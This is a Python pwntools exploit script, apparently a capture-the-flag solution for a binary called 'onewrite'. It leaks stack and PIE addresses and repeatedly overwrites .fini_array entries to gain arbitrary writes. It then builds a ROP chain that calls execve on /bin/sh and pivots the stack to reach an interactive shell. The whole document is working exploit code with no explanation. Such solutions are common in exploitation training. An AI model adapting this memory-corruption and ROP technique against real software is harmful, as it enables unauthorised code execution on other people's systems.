#!/usr/bin/env python3

from pwn import *

exe = ELF("./onewrite")

r = process("./onewrite")

STACK_LEAK = "1"
PIE_LEAK = "2"

# leak stack address

r.sendline(STACK_LEAK)
r.recvuntil("> 0x")
stack_addr = int(r.recvn(12), 16)
log.info("stack address leak: {}".format(hex(stack_addr)))

# return in call do_leak()

ret_overwrite = stack_addr + 24
r.send(str(ret_overwrite - 7))
r.send("A" * 7 + "\x04") 

# leak pie address

r.sendline(PIE_LEAK)
r.recvuntil("> 0x")
pie_addr = int(r.recvn(12), 16)
exe.address = pie_addr - exe.symbols['do_leak']
log.info("elf base: {}".format(hex(exe.address)))

# overwrite .fini_array entries with do_overwrite()

finiArr = exe.symbols['__do_global_dtors_aux_fini_array_entry']
csuFini = exe.symbols['__libc_csu_fini']

log.info(".fini_array address: {}".format(hex(finiArr)))
log.info("__libc_csu_fini address: {}".format(hex(csuFini)))
log.info("do_overwrite address: {}".format(hex(exe.symbols['do_overwrite'])))

r.send(str(finiArr + 8))
r.send(p64(exe.symbols['do_overwrite']))

r.send(str(finiArr))
r.send(p64(exe.symbols['do_overwrite']))

ret_csuFini = stack_addr - 72 

r.send(str(ret_csuFini))
r.send(p64(csuFini))
ret_csuFini += 8

binsh = exe.address + 2831256
popRax = exe.address + 0x00000000000460ac
popRdi = exe.address + 0x00000000000084fa
popRsi = exe.address + 0x000000000000d9f2
popRdx = exe.address + 0x00000000000484c5
syscall = exe.address + 0x0000000000073baf
pivot = exe.address + 0x00000000000106f3 # add rsp, 0xd0 ; pop rbx ; ret  == add rsp, 0xd8 ; ret                                                                                                  

log.info("string .bss address: {}".format(hex(binsh)))
log.info("pivot address: {}".format(hex(pivot)))

def write(address, value):
	r.send(str(address))
	r.send(p64(value))

	global ret_csuFini
	r.send(str(ret_csuFini))
	r.send(p64(csuFini))
	ret_csuFini += 8

write(binsh, u64("/bin/sh\x00"))

write(stack_addr + 0xd0, popRdi)
write(stack_addr + 0xd8, binsh)
write(stack_addr + 0xe0, popRsi)
write(stack_addr + 0xe8, 0)
write(stack_addr + 0xf0, popRdx)
write(stack_addr + 0xf8, 0)
write(stack_addr + 0x100, popRax)
write(stack_addr + 0x108, 0x3b)
write(stack_addr + 0x110, syscall)

write(stack_addr - 0x10, pivot)


r.interactive()